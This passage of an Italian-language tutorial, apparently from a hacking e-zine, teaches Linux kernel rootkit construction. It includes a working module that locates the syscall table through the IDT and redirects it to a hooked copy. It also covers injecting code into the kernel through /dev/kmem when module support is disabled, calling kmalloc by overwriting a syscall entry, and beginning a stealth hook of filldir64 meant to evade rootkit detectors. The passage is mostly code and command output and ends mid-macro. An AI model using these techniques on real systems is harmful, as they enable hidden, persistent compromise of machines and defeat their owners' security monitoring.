+ c0107b8c:       c7 44 24 18 da ff ff    movl   $0xffffffda,0x18(%esp,1)
+ c0107b93:       ff
+ c0107b94:       e8 37 4b 00 00          call   c010c6d0 <syscall_trace>
+ c0107b99:       8b 44 24 24             mov    0x24(%esp,1),%eax
+ c0107b9d:       3d 0e 01 00 00          cmp    $0x10e,%eax
+ c0107ba2:       73 0b                   jae    c0107baf <tracesys_exit>
+ c0107ba4:       ff 14 85 f8 8f 30 c0    call   *0xc0308ff8(,%eax,4) <- Eccolo
+ c0107bab:       89 44 24 18             mov    %eax,0x18(%esp,1)
+ 
+ed il kernel ci accede nel medesimo modo. Tutto qui, non ci sono altre
+occorrenze, forse e` davvero semplice com'era sembrato all'inizio... :) Notate
+anche gli indirizzi, sono funzioni molto vicine, percio` con un piccolo
+parsing su una zona di memoria limitata dovremmo essere in grado di
+localizzarle tutte.
+Procediamo in questo modo allora:
+
+- Creiamo una sys call table "finta".
+- Copiamo la sys call table vera in quella finta.
+- Modifichiamo un puntatore a funzione della sys call table finta per prova.
+- Sovrascriviamo l'indirizzo in memoria della sys call table originale con
+  quello della nostra finta.
+
+<-| LKEPD/int80.c |->
+#define __KERNEL__
+#define MODULE
+#ifdef CONFIG_MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <sys/syscall.h>
+
+struct {
+     unsigned short not_interesting;
+     unsigned int start;
+} __attribute__ ((packed)) idt;
+
+struct {
+     unsigned short addr1;
+     unsigned char  not_interesting[4];
+     unsigned short addr2;
+} __attribute__ ((packed)) idt_entry;
+
+/* Questa funzione fa` l'equivalente di memmem(buffer,"\xff\x14\x85",3) */
+char  *parse(char *start,int size)
+{
+   char           *p;
+   for (p = start; p < start + size; p++)
+   if (*p  == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')
+	    return p;
+   return NULL;
+}
+
+static unsigned long sct;
+static unsigned long *n_s_c_t; /* Puntatore alla nostra nuova sys call table */
+
+int (*o_setuid32)(unsigned int id);
+
+int n_setuid32(unsigned int id)
+{
+/* Nulla di complesso, solo un semplice saluto :-) */
+
+	printk("Hello world\n");
+	return o_setuid32(id);
+}
+
+/* Cerca per 200 bytes l'indirizzo della sys call table e lo sostituisce con
+   quello della nostra tabella
+ */
+int seek_and_change(unsigned long addr)
+{
+	unsigned char *ptr;
+	unsigned long counter=addr,times=0;
+	 
+	for(ptr=(unsigned char*)addr;ptr<ptr+200;ptr++)
+		if(*(unsigned long*)ptr==sct)
+		{
+		    /* Ricordate? Deve trovare 2 occorrenze */
+			if(++times==2)
+				 return 0;
+			*(unsigned long*)ptr=(unsigned long)n_s_c_t;
+		}
+	if(times==0)
+		return -1;
+
+	return 0;
+}
+
+/* Cerca per 200 bytes l'indirizzo della nostra tabella e lo sostituisce
+   con quello originale. Verra` usata nel cleanup.
+ */
+int seek_and_restore(unsigned long addr)
+{
+	unsigned char *ptr;
+	unsigned long counter=addr,times=0;
+	for(ptr=(unsigned char*)addr;ptr<ptr+200;ptr++)
+		if(*(unsigned long*)ptr==(unsigned long)n_s_c_t)
+		{
+			if(++times==2)
+				return 0;
+			*(unsigned long*)ptr=sct;
+		}
+	if(times==0)
+		return -1;
+	return 0;
+}
+
+	 
+static char		*ptr;
+static char            buffer[100]={ 0 };
+static unsigned long   int80_routine;
+
+int init_module(void)
+{
+
+	asm ("sidt %0" : "=m" (idt));
+	memcpy(&idt_entry,(unsigned long*)(idt.start+8*0x80),sizeof(idt_entry));
+	int80_routine= (idt_entry.addr2 << 16) | idt_entry.addr1;
+	memcpy(buffer,(unsigned long*)int80_routine,sizeof(buffer));
+	ptr=(char*)parse(buffer,sizeof(buffer));
+	if (!ptr)
+		return -1;
+	sct=*(unsigned long*)(ptr+3);
+	/* Ok, ora che abbiamo trovato la sys call table allochiamo memoria
+	   per quella nuova
+	 */
+	n_s_c_t=(unsigned long*)kmalloc(256*sizeof(void*),GFP_KERNEL);
+
+	/* Copiamo la sct originale nella nostra */
+	memcpy(n_s_c_t,(unsigned long*)sct,256*sizeof(void*));
+	
+	/* Salviamo il puntatore originario */
+	o_setuid32=(void*)((unsigned long*)sct)[SYS_setuid32];
+	
+	/* Modifichiamo il puntatore con la nostra funzione */
+	n_s_c_t[SYS_setuid32]=(unsigned long)n_setuid32;
+	
+	/* Modifichiamo i valori in memoria */
+	if(seek_and_change(int80_routine)<0) {
+		kfree(n_s_c_t);
+		return -1;
+	}
+
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	seek_and_restore(int80_routine);
+	kfree(n_s_c_t);
+}
+<-X->
+
+Compiliamo e testiamo:
+
+ Vortex:/tmp# insmod int80.o
+ Vortex:/tmp# su angel
+ angel@Vortex:/tmp$ dmesg
+ Hello world
+ angel@Vortex:/tmp$
+ 
+Funziona :>
+
+
+- IL PROBLEMA
+
+Tutte le tecniche piu` o meno complesse che abbiamo visto fin'ora ci
+consentono di nascondere egregiamente praticamente ogni tipo di informazione
+a noi scomoda, ma hanno tutte il medesimo enorme problema: sono tutte
+utilizzabili solamente se la macchina su cui ci troviamo ha il supporto per i
+moduli. Inoltre, di recente, si e` diffusa la curiosa convinzione che basti
+disabilitare il supporto per i moduli per mettersi al riparo dagli attacchi a
+kernel space. La cosa sarebbe fastidiosa davvero, se non fosse per il fatto
+che e` una convinzione completamente sbagliata.
+Ora andremo a vedere come "installare" dei moduli in una macchina senza
+supporto per i moduli :)
+
+
+- FORMA E STRUTTURA
+
+Come penso abbiate gia` immaginato, e` proprio questo il momento in cui
+rientra in scena /dev/kmem, cosi` come l'abbiamo usato in lettura possiamo
+utilizzarlo in scrittura. Quando andiamo ad inserire un modulo nel kernel con
+insmod non facciamo altro che aggiungere/modificare dati a kernel space, cosa
+che possiamo fare benissimo a userspace lavorando su kmem dato che le zone di
+memoria raggiungibili sono le stesse.
+
+Innanzitutto, dobbiamo ricordarci che con kmem andiamo accedere direttamente
+alla memoria e quello che conterra` sara` codice macchina, pertanto non
+potremo semplicemente "copiare" il file del nostro modulo su kmem per farlo
+funzionare, sara` necessario un po` di lavoro in piu`. (Pensavate davvero che
+fosse cosi` facile? ;)
+ 
+Nel modo in cui andremo a lavorare, ovvero copiando direttamente del codice
+pronto da eseguire in memoria, non avremo il supporto del linker, percio`
+dovremo lavorare senza poter utilizzare i simboli del kernel, variabili
+globali e stringhe, in quanto e` proprio quest'ultimo che si occupa della
+loro rilocazione.
+Normalmente e` insmod che si occupa di queste cose, infatti se avete notato,
+abbiamo sempre compilato i nostri moduli con l'opzione -c :
+
+"...For example, the -c option says not to run the linker."
+[dal manuale di gcc]
+
+Non potremo nemmeno usare funzioni che richiedano linking, percio` scordatevi
+le librerie "normali" :-)
+Dovremo produrre una massa di codice perfettamente funzionante "cosi` com'e`".
+
+Dovremo inoltre trovare un modo di allocare della memoria a kernel space ed
+uno per "attivare" una funzione kernel space, il tutto restando ad userspace.
+ 
+Un'iniziale scaletta del nostro procedimento potrebbe essere questa:
+
+- Crea la massa di codice.
+- Alloca memoria a kernel space.
+- Copia il codice nella memoria precedentemente allocata.
+- Avvia la funzione di init del nostro programma (l'equivalente
+  dell'init_module in sostanza).
+
+- ALCUNE PRECISAZIONI
+
+Quando ho detto che non avremmo potuto utilizzare variabili globali e
+stringhe... in parte ho mentito :P
+Non potremo utilizzarle nel modo "normale" in cui siamo abituati a farlo, ma
+e` possibile creare delle variabili accessibili ovunque (percio` come se
+fossero globali), ma che non necessitano di rilocazione, o meglio,
+autorilocanti: sara` la variabile stessa a fornirci il suo indirizzo.
+Ho mentito anche quando dicevo che non avremmo potuto usare simboli del
+kernel... diciamo che non e` possibile utilizzarli nella maniera consueta, ma
+anche qui con qualche trucchetto ce la possiamo cavare.
+
+- VARIABILI GLOBALI
+
+Veniamo alle variabili autorilocanti. Il trucco e' molto semplice,
+trasformeremo la nostra variabile in una funzione che una volta chiamata ci
+restituisca un puntatore ad una zona di memoria contenente il suo valore.
+Ok, forse non e` proprio cosi` semplice da dire a parole, vediamo percio`
+qualche frammento di codice che ci aiuti a capire meglio.
+
+Analizziamo questo pseudocodice assembly:
+
+	       call ETICHETTA1  <--- Punto di partenza
+	       ...
+	       ...
+	       ...
+ ETICHETTA2:   pop eax
+ 	       ret
+ ETICHETTA1:   call ETICHETTA2
+	       .stringa "Ciao mondo"
+
+Passo 1: il programma va ad eseguire il jump che sposta l'esecuzione del
+         programma ad ETICHETTA1.
+Passo 2: viene eseguita la call, questo fa` si` che l'esecuzione del programma
+         si sposti ad etichetta 2 e l'indirizzo di ritorno (ovvero dove
+         dovrebbe riprendere l'esecuzione del programma una volta finita la
+         call) venga salvato nello stack.
+Passo 3: il valore in cima allo stack (ovvero l'indirizzo di ritorno della
+         call) viene messo nel registro eax.
+Passo 4: viene eseguita la ret, la call finisce ed abbiamo il suo indirizzo di
+         ritorno in eax.
+
+Ma a cosa ci serve l'indirizzo di ritorno della call? Come potete vedere
+quello che c'e` dopo la call e` la stringa "Ciao mondo", percio` in eax avremo
+salvato l'indirizzo di questa stringa.
+Noi e` proprio in questo modo che opereremo, al posto di "Ciao mondo" ci sara`
+la zona di memoria contenente il valore della nostra variabile, ovunque esso
+sia senza bisogno di rilocazione.
+Creeremo una struttura dove ogni suo campo e` un componente dell'algoritmo
+spiegato (call,pop e valore) poi la convertiremo in funzione tramite cast ed
+infine la chiameremo (i bytes sono tutti "in fila" in memoria, percio`
+funziona :)
+
+<-| LKEPD/autoreloc.c |->
+#define RELOC(tipo, quante, nome, valori...) \
+          struct s_##nome {       \
+	          /* Opcode e parametri della call
+                   */
+	          unsigned char   opcodes[5];  \
+                  /* Ci dice quanto dobbiamo saltare: in questo caso il ret ed
+                     il pop eax sono messi dopo la call:
+                          call etichetta;
+                          valori
+                     etichetta:pop
+                          ret
+                     Come potete vedere il risultato e` lo stesso, dovremo
+                     saltare in avanti di n bytes, dove n e` il numero delle
+                     variabili memorizzate per la loro dimensione
+                   */
+		  tipo    dimensione[quante];  \
+		  /* Gli opcodes del pop e del ret
+		   */
+		  unsigned char   opcodes2[2]; \
+          } __attribute__((packed)); \
+          static struct s_##nome f_##nome = \
+	  /*  nell'ordine:
+	      opcode della call con spiazzamento a 32 bit
+	      primi 8 bit della dimensione del salto
+	      secondi 8 bit della dimensione del salto
+	      terzi 8 bit della dimensione del salto
+	      ultimi 8 bit della dimensione del salto
+	   */
+              {{0xe8, sizeof(f_##nome.dimensione) & 0xff,\
+	      (sizeof(f_##nome.dimensione) >> 8) & 0xff,\
+	      (sizeof(f_##nome.dimensione) >> 16) & 0xff,\
+	      (sizeof(f_##nome.dimensione) >> 24) & 0xff  },\
+	      /* Valori contenuti nelle/a variabili/e */
+              {valori},                  \
+	      /* pop eax
+	         ret
+	       */
+              {0x58, 0xc3}\
+          };          \
+          static inline tipo *nome(void) \
+          {                       \
+	  /* Castiamo a funzione la struttura appena creata e la eseguiamo */
+               tipo *(*func)() = (void *) &f_##nome; \
+               return func();  \
+          }
+
+#define R_VAR(tipo, nome, valori)   \
+        RELOC(tipo, 1, nome, valori)
+
+R_VAR(int,pippo,123456);
+
+int main(void)
+{
+    printf("%d\n",*(pippo()));
+    return 0;
+}
+<-X->
+
+ Vortex:~# gcc autoreloc.c -o autoreloc
+ Vortex:~# ./autoreloc
+ 123456
+ Vortex:~#
+
+- UTILIZZARE LE FUNZIONI DEL KERNEL
+
+State tranquilli, questo e` molto meno laborioso, e` un semplice gioco di
+puntatori :) Mettiamo di voler utilizzare la printk per stampare un messaggio
+di debug, tutto quello di cui abbiamo bisogno e`:
+
+- L'indirizzo della stringa da stampare <= Lo troviamo tramite una variabile
+                                           autorilocante
+- L'indirizzo della printk <= Lo troviamo tramite parsing o System.map
+- 4 bytes a kernel space <= Vedremo dopo come ottenerli, ora ipotizziamo di
+                            avere una variabile autorilocante che restituisca
+			    un puntatore a questi 4 bytes
+
+La sintassi e` semplice:
+
+int (**printk)(char*,...);
+printk=(void*)(unsigned long)*my_bytes(); <= Ora *printk punta ai nostri bytes
+*printk=(void*)PRINTK_ADDRESS; <= Scriviamo l'indirizzo della printk
+(**printk)(print_string()); <= Chiamiamo la funzione il cui indirizzo e` sui
+                               nostri bytes
+ 
+- CREARE IL CODICE
+
+Ora vedremo come creare la massa di codice eseguibile senza "troppi" problemi.
+Al fine di facilitare la comprensione della tecnica non andremo a lavorare
+subito col kernel, ma implementeremo un semplice programma che scriva "Ciao"
+sullo schermo.
+Il primo problema e` come dire alla macchina che deve scrivere qualcosa: non
+possiamo usare librerie, percio` dobbiamo trovare un sistema per dire
+direttamente al kernel che syscall vogliamo eseguire e con che parametri. Se
+vi ricordate abbiamo gia` visto come fare nella parte sull'IDT, basta mettere
+i valori corretti nei registri e chiamare l'int 0x80. Il kernel stesso ci mette
+a disposizione delle macro per fare questo, non sara` necessario studiarsi la
+struttura di tutte le syscall che vorremo utilizzare :) Le trovate in unistd.h
+nei sorgenti del kernel.
+Guardiamo quella che ci interessa, quella relativa alla sys_write:
+
+#define __NR_write              4 <---- Numero della syscall
+
+#define _syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
+type name(type1 arg1,type2 arg2,type3 arg3) \
+{ \
+long __res; \
+__asm__ volatile ("int $0x80" \
+    : "=a" (__res) \
+    La linea seguente posiziona gli argomenti nei registri corretti:
+    : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)),
+                                                        "d" ((long)(arg3))); \
+    return(type) (__res); \ <--- Nel kernel a questo punto viene chiamata
+                                 un'altra macro per effettuare un controllo
+				 sul valore ritornato, l'ho rimossa per
+				 semplicita`, ma e` equivalente.
+}
+
+static inline _syscall3(int,write,int, fd,const char *,ptr,long,size);
+ 
+Come vedete basta sapere il numero degli argomenti della syscall che ci
+interessa ed il suo numero per utilizzare la macro corrispondente. A questo
+punto la nostra chiamata write(x,y,z) e` perfettamente equivalente a quella
+che usiamo di solito.
+Veniamo alla stringa da stampare, "Ciao", ovviamente dovra` essere
+autorilocante, ma abbiamo gia` visto prima come fare: sara` sufficiente dirgli
+che e` una variabile di tipo char di dimensione sizeof("Ciao").
+
+ #define S_VAR(nome, valori) \
+         RELOC(char ,sizeof(valori),nome,valori)
+
+Vediamo dunque il codice nella sua versione finale:
+
+<-| LKEPD/data.c |->
+#define __NR_write              4
+  
+asm(".globl code_start\n\t" ".globl code_end\n\t");
+/* Vedremo dopo il significato di questa parte in asm, per ora non badateci */
+ 
+#define _syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
+type name(type1 arg1,type2 arg2,type3 arg3) \
+{ \
+long __res; \
+__asm__ volatile ("int $0x80" \
+                   : "=a" (__res) \
+                   : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)),
+                                                        "d" ((long)(arg3))); \
+                   return(type) (__res); \
+}
+						        
+static inline _syscall3(int,write,int, fd,const char *,ptr,long,size);
+							 
+							  
+#define RELOC(tipo, quante, nome, valori...) \
+        struct s_##nome {       \
+                     unsigned char   opcodes[5];\
+                     tipo    dimensione[quante]; \
+                     unsigned char   opcodes2[2];   \
+        } __attribute__((packed)); \
+        static struct s_##nome f_##nome = \
+                      {{0xe8, sizeof(f_##nome.dimensione) & 0xff,\
+                       (sizeof(f_##nome.dimensione) >> 8) & 0xff,\
+                       (sizeof(f_##nome.dimensione) >> 16) & 0xff,\
+                       (sizeof(f_##nome.dimensione) >> 24) & 0xff  },\
+                       {valori},                  \
+                       {0x58, 0xc3}\
+        };          \
+        static inline tipo *nome(void) \
+        {                       \
+                      tipo *(*func)() = (void *) &f_##nome; \
+	              return func();  \
+	}
+#define S_VAR(nome, valori) \
+        RELOC(char ,sizeof(valori),nome,valori)
+ 
+S_VAR(pippo,"ciao\n");
+
+
+int init(void) {
+      write(1,pippo(),5);
+}
+<-X->
+
+Adesso compiliamo senza assemblare e guardiamo il codice che viene prodotto:
+ 
+ Vortex:~# gcc -nostdlib -c -O3 data.c -S -o data.s
+ Vortex:~# cat data.s
+	 .file   "data.c"
+ #APP
+         .globl code_start
+         .globl code_end
+ #NO_APP
+         .data
+         .type   f_pippo, @object
+         .size   f_pippo, 13
+ f_pippo:
+         .byte   -24
+         .byte   6
+         .byte   0
+         .byte   0
+         .byte   0
+         .string "ciao\n"
+         .byte   88
+         .byte   -61
+         .text
+         .p2align 4,,15
+ .globl init
+         .type   init, @function
+ init:
+         pushl   %ebp
+         movl    %esp, %ebp
+         subl    $8, %esp
+         movl    %ebx, -4(%ebp)
+         movl    $1, %ebx
+         call    f_pippo
+         movl    %eax, %ecx
+         movl    $5, %edx
+         movl    $4, %eax
+ #APP
+         int $0x80
+ #NO_APP
+         movl    -4(%ebp), %ebx
+         movl    %ebp, %esp
+         popl    %ebp
+         ret
+         .size   init, .-init
+         .section        .note.GNU-stack,"",@progbits
+         .ident  "GCC: (GNU) 3.3.3 (Debian)"
+ 
+No tranquilli, non serve andare ad analizzare tutto questo, dobbiamo solo
+modificarlo un po' andando a rimuovere zone che non ci servono a niente e
+raggruppando tutto il codice in un solo segmento. 
+Agiremo in questo modo:
+ 
+- Inseriremo un tag .data o .text in cima al file.
+- Inseriremo un'etichetta code_start subito dopo (vedremo in seguito il
+  perche`).
+- Rimuoveremo tutte le rige inutili (cioe` non strettamente necessarie al
+  programma per funzionare).
+- Inseriremo un'etichetta code_end sul fondo (idem come sopra).
+
+Per fortuna e` possibile automatizzare questo passo tramite l'utilizzo di
+grep. Ecco un piccolo script che fa` quanto detto:
+
+<-| LKEPD/data.sh |->
+#!/bin/bash
+echo ".text" > data.s
+echo "code_start:" >> data.s
+gcc -S -O3 -nostdlib data.c -o - | \ grep -vE \
+"\.align|\.p2align|\.text|\.data|\.rodata|#|\.ident|\.file|\.version|\.note" \
+>> data.s
+echo "code_end:" >> data.s
+gcc -c data.s -o data.o
+<-X->
+
+Ecco fatto, proviamo a vederne il dump:
+
+ data.o:     file format elf32-i386
+  
+  Disassembly of section .text:
+   
+	00000000 <code_start>:
+	   0:   e8 06 00 00 00          call   b <code_start+0xb>
+	   5:   63 69 61                arpl   %bp,0x61(%ecx)
+           8:   6f                      outsl  %ds:(%esi),(%dx)
+	   9:   0a 00                   or     (%eax),%al
+	   b:   58                      pop    %eax
+	   c:   c3                      ret
+	   d:   8d 76 00                lea    0x0(%esi),%esi
+	      
+	00000010 <init>:
+          10:   55                      push   %ebp
+	  11:   ba 01 00 00 00          mov    $0x1,%edx
+          16:   89 e5                   mov    %esp,%ebp
+	  .....
+	  ....
+	  ..
+	  .
+			    
+Tutto nello stesso segmento :)
+ 
+- CARICARE IN MEMORIA IL CODICE
+
+Dobbiamo in primo luogo trovare come allocare della memoria senza la famiglia
+di funzioni *alloc.
+Una loro reimplementazione e` fuori discussione, troppo laboriosa, possiamo
+invece utilizzare un'altra funzione al nostro scopo, la mmap. Possiamo
+chiedere al sistema di mmapparci tot bytes con permessi di
+lettura/scrittura/esecuzione dove copieremo ed andremo ad eseguire il codice
+realizzato poco fa.
+Dobbiamo scoprire ancora 2 cose:
+
+1) Dove si trova il codice che vogliamo caricare in memoria.
+2) Quanto e` grande.
+
+Ora entrano in gioco le etichette apparentemente senza senso che abbiamo
+inserito nel file poco fa all'inizio ed alla fine del segmento in cui abbiamo
+raggruppato il nostro codice: se noi nel programma che si occupa di caricare
+il codice dichiariamo due funzioni come extern in questo modo
+
+ extern void code_start();
+ extern void code_end();
+
+poi compiliamo come codice oggetto e lo linkiamo al file data.o l'effetto
+sara` di associare quelle funzioni alle etichette precedentemente dichiarate.
+A questo punto il gioco e` fatto: se noi utilizziamo semplicemente il nome di
+queste funzioni (senza chiamarle) l'effetto sara` di avere il loro indirizzo
+che corrisponde con l'inizio e la fine del codice da inserire :)
+Percio` il codice sara` grande:
+ (unsigned long)code_end - (unsigned long)code_start
+ed iniziera` alla posizione (unsigned long)code_start . 
+
+<-| LKEPD/charge.c |-> 
+#define __NR_mmap              90
+#define __NR_old_mmap          __NR_mmap
+
+#define PROT_READ       0x1
+#define PROT_WRITE      0x2
+#define PROT_EXEC       0x4
+#define MAP_PRIVATE     0x02
+#define MAP_ANONYMOUS   0x20
+
+extern void code_start();
+extern void code_end();
+extern void init(void); /* Anche la funzione di init aveva un'etichetta che
+                           verra' associata a questa funzione, la chiameremo
+			   per farla partire
+			 */
+/* Struttura utilizzata come argomento della mmap */
+struct mmap_arg_struct {
+        unsigned long addr;
+        unsigned long len;
+        unsigned long prot;
+        unsigned long flags;
+        unsigned long fd;
+        unsigned long offset;
+};
+
+
+#define _syscall1(type,name,type1,arg1) \
+type name(type1 arg1) \
+{ \
+	long __res; \
+		__asm__ volatile ("int $0x80" \
+  			          : "=a" (__res) \
+				  : "0" (__NR_##name),"b" ((long)(arg1))); \
+		return(type) (__res); \
+}
+
+
+static inline _syscall1(void*,old_mmap,struct mmap_arg_struct *, ptr);
+
+static inline void * malloc(unsigned long size) {
+     struct mmap_arg_struct arg= {0,size,PROT_EXEC|PROT_READ|PROT_WRITE,
+                                              MAP_PRIVATE|MAP_ANONYMOUS,0,0 };
+     return old_mmap(&arg);
+ }
+
+void my_memcpy(char *to,char *from,int size)
+{
+	int i;
+	for(i=0;i<size;i++)
+		*to++=*from++;
+}
+
+
+int main(void)
+{
+   /* Allochiamo */	
+   char *ptr=(char*)malloc((unsigned long)code_end-(unsigned long)code_start);
+
+   /* Copiamo */
+   my_memcpy(ptr,(char*)code_start,
+                             (unsigned long)code_end-(unsigned long)code_start);
+
+   /* Attiviamo */
+   init();
+   return 0;
+}
+<-X->
+
+ Vortex:~# gcc -c -O3 -nostdlib charge.c -o charge.o
+ Vortex:~# gcc data.o charge.o -o charge
+ Vortex:~# ./charge
+ ciao
+ Vortex:~#
+
+L'unica differenza tra questo e lavorare con kmem sara` dove andremo a
+scrivere :)
+Qui e` bastata una mmap per allocare spazio, mentre per ottenere memoria a
+kernel space dobbiamo necessariamente chiamare la kmalloc. Ora vedremo come.
+
+
+SEZIONE VII
+===========
+
+- ALLOCAZIONE DI MEMORIA ED ATTIVAZIONE FUNZIONI A KERNEL SPACE
+
+Contrariamente a quanto si possa pensare allocare memoria a kernel space e`
+piuttosto facile dato che abbiamo bisogno solo di 3 cose:
+
+- L'indirizzo della kmalloc => Lo otteniamo tramite parsing/System.map
+- Il valore di GFP_KERNEL   => Lo otteniamo tramite parsing o tenendone un
+                               elenco con le rispettive versioni del kernel
+
+- Un modo di comunicare con kernelspace da userspace per passare i parametri
+alla kmalloc e ricevere l'indirizzo della memoria allocata
+
+Pensate un attimo, l'ultimo punto non vi sa di dejavu? Noi abbiamo gia un
+sistema che ci permette di comunicare valori/eseguire operazioni/ottenere un
+risultato con il kernel... le sys call :)
+Non dovremo fare altro che sovrascrivere l'indirizzo di una syscall con almeno
+2 parametri con quello della kmalloc, chiamarla salvando il risultato e
+ripristinare l'indirizzo originario. A questo punto abbiamo l'indirizzo della
+zona di memoria allocata, percio` possiamo andare a copiare in quella memoria
+il nostro codice. Per "attivare" la funzione di init non dovremo fare altro
+che utilizzare la tecnica di prima sovrascrivendo l'indirizzo di una syscall
+con l'indirizzo del nostro init e poi chiamarlo. Semplice vero? :)
+
+- L'IMPLEMENTAZIONE
+
+Normalmente questa tecnica e` usata in concomitanza con l'hijacking della sys
+call table dato che e` un sistema semplice, pulito e dagli ottimi risultati,
+ma e` altresi` vero che ormai un hook simile e` facilmente rilevabile da un
+qualsiasi detector di rootkit. Ora come ora, penso che l'unico sistema per
+rimanere occultati a lungo sia quello di iniziare a giocare con le funzioni
+del virtual file system di linux (sarebe una cosa tipo quello che abbiamo
+fatto con /proc ) dato che non si sa il perche` nessuno le controlla, oppure
+andare a lavorare con le funzioni interne del kernel.
+Non ho mai visto implementazioni di nessuno di questi 2 sistemi, ma dato che
+il secondo e` un po' piu` complesso come realizzazione ed offre un
+occultamento estremamante elevato se usato intelligentemente vedremo un
+esempio di questo. Chiaramente il discorso che ho fatto all'inizio,
+occultamento VS portabilita` e` ancora valido: sta a voi scegliere come e dove
+operare.
+
+Ovviamente non implementeremo tutti gli occultamenti visti fin'ora con questa
+tecnica, mostero` solo un esempio di hook alla filldir64. Questa e` una
+funzione interna alla getdents64 (per cui difficilmente controllata) il cui
+compito (a grandi linee) puo' essere definito come il "riempire" il buffer di
+output della getdents.
+Daremo per scontato di conoscerne l'indirizzo (e` facilmente ottenibile
+tramite parsing) e daremo per noti anche gli indirizzi della sys call table,
+della kmalloc ed il valore di GFP_KERNEL.
+
+- STRUTTURA
+
+Lo schema generale degli hook rimarra` il medesimo: filtraggio dell'input
+prima di eseguire la chiamata oppure dopo averla eseguita. Per questo motivo
+necessitiamo di memorizzare nella memoria allocata anche alcune informazioni
+tipo i bytes di backup.
+
+struct hook
+{
+        char inject[7];
+        char backup[7];
+        char *pointer;
+}__attribute__((packed));
+
+Un nostro hook sara` rappresentato dalla struttura qui sopra, i primi 7 bytes
+sono riservati per memorizzare il codice di injecting, gli altri 7
+memorizzeranno i bytes che andremo a sovrascrivere mentre il puntatore finale
+servira` come puntatore "base" per poter chiamare la funzione del kernel
+corrispondente all'hook (se non vi e` chiaro non importa, capirete dopo
+guardando il codice)
+
+struct pointer {
+  	char *ptr;
+}__attribute__((packed));
+ 
+Ognuna di queste strutture rappresenta una funzione del kernel (esterna ad un
+hook) che andremo ad utilizzare. Questa soluzione e` ben lungi dall'essere
+ottimizzata, ma mi sembra che cosi` facendo, separando i dati, ci sia una
+maggior chiarezza concettuale.
+
+Dopo che avremo allocato la memoria kernel dovremo creare questo schema:
+
+  |  structs hook  | structs pointer |  codice delle funzioni  |
+  |________________|_________________|_________________________|
+ Inizio	Memoria						   Fine Memoria
+
+Possiamo allocare qualsiasi numero di strutture hook/pointer, bisogna solo
+tenere conto di quante per calcolare in seguito gli spiazzamenti del codice.
+
+<-| LKEPD/eclipse.h |->
+/* File di include, eclipse.h */
+
+/* Definizione dei numeri delle syscall che utilizzeremo */
+ 
+#define __NR_m_exit     1
+#define __NR_read       3
+#define __NR_write      4
+#define __NR_open       5
+#define __NR_lseek      19
+#define __NR_olduname   59
+#define __NR_KMALLOC    __NR_olduname /* Chiameremo la olduname prima per
+                                         allocare poi per attivare */
+#define __NR_KSTART     __NR_olduname
+
+#define SEEK_SET        0
+#define S_IRWXU         00700
+#define O_RDWR          02
+#define GFP_KERNEL      0x1f0  /* Se il kernel e` un 2.4 dovrebbe andare bene
+                                  questo, comunque controllate */
+#define NULL            (void*)0
+
+#define A_KMALLOC       Inserite /* Indirizzo kmalloc */
+#define A_SCT           i vostri /* Indirizzo sys call table */
+#define FILLDIR64 	 valori  /* Indirizzo filldir64 */
+#define HOOKS           1 /* Significa che andremo ad agganciare solo 1
+                             funzione */
+#define POINTERS        0 /* Non useremo puntatori sciolti, percio` 0 */
+
+extern void code_start();
+extern void code_end();
+
+
+#define _syscall1(type,name,type1,arg1) \
+type name(type1 arg1) \
+{ \
+long __res; \
+  __asm__ volatile ("int $0x80" \
+                     : "=a" (__res) \
+                     : "0" (__NR_##name),"b" ((long)(arg1))); \
+                   return(type)(__res); \
+}
+
+#define _syscall2(type,name,type1,arg1,type2,arg2) \
+type name(type1 arg1,type2 arg2) \
+{ \
+ long __res; \
+  __asm__ volatile ("int $0x80" \
+                    : "=a" (__res) \
+                    : "0" (__NR_##name),"b" ((long)(arg1)),
+                                                        "c" ((long)(arg2))); \
+                    return(type) (__res); \
+}
+ 
+#define _syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
+type name(type1 arg1,type2 arg2,type3 arg3) \
+{ \
+ long __res; \
+ __asm__ volatile ("int $0x80" \
+                   : "=a" (__res) \
+                   : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)),
+		                                        "d" ((long)(arg3))); \
+                   return(type) (__res); \
+ }
+
+static inline _syscall3(int,write,unsigned int, fd,const char *,ptr,long,size);
+static inline _syscall3(int,read,unsigned int, fd, char *, ptr,long, size);
+static inline _syscall3(long,lseek,unsigned int,fd,int,offset,int, modo);
+static inline _syscall3(int,open,char *, sptr, int, modo,int, permessi);
+static inline _syscall2(unsigned long,KMALLOC,unsigned long,size,
+                                                           unsigned int,gfp);
+static inline _syscall2(unsigned long ,KSTART,unsigned long, mem,
+                                                           unsigned long, sct);
+static inline _syscall1(void,m_exit,int,status);
+
+struct hook
+{
+         unsigned char inj_code[7];
+         unsigned char backup[7];
+         /* Puntatore a kspace da utilizzare come base per chiamare la
+          * funzione originaria
+          */
+         unsigned char *base_ptr;
+}__attribute__((packed));
+     
+struct pointer
+{
+      char *ptr;
+}__attribute__((packed));
+
+/* Legge dal file descriptor fd alla posizione offset size bytes e li mette in
+   buf */
+
+static inline int rkm(int fd, int offset, void *buf, int size)
+{
+    if (lseek(fd, offset, 0) != offset)
+                return 0;
+    if (read(fd, buf, size) != size)
+                return 0;
+    return size;
+}
+
+/* Scrive  sul file descriptor fd alla posizione offset size bytes dal buffer
+   buf */
+
+static inline int wkm(int fd, int offset, void *buf, int size)
+{
+    if (lseek(fd, offset, 0) != offset)
+                return 0;
+    if (write(fd, buf, size) != size)
+                return 0;
+    return size;
+}
+
+void m_memcpy(char *to,char *from, unsigned int size)
+{
+        int i;
+        for(i=0;i<size;i++)
+             *to++=*from++;
+}
+
+int my_strlen(char *string)
+{
+         int len=0;
+         while(*string!='\0')
+         {
+                len++;
+                 string++;
+         }
+         return len;
+}
+
+int my_strncmp(char *string1,char *string2,int size)
+{
+         int i;
+         for(i=0;i<size;i++,string1++,string2++)
+                if(*string1!=*string2)
+                      return 1;
+         return 0;
+}
+
+#define RELOC(tipo, quante, nome, valori...) \
+          struct s_##nome {       \
+                 unsigned char   opcodes[5];\
+                 tipo    dimensione[quante]; \
